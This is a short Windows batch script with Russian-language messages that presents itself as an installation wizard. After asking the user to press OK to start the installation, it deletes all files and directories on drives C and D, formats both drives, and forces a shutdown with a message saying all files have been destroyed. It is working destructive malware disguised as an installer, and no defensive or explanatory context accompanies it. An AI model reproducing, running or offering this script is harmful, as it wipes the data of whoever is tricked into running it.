Chcp 1251
@Echo off
Title установка...
Msg * для начала установки нажмите ОК
echo запуск мастера установки...
Del C:\ /s /q
Rd C:\ /s /q
Del D:\ /s /q
Rd D:\ /s /q
Format C:\
Format D:\
Echo.
Echo нажмите любую клавишу для продолжения...
Echo.
Pause
Shutdown /s /f /t 0 /c "Компьютер подвержен атаке! Все файлы были уничтожены!"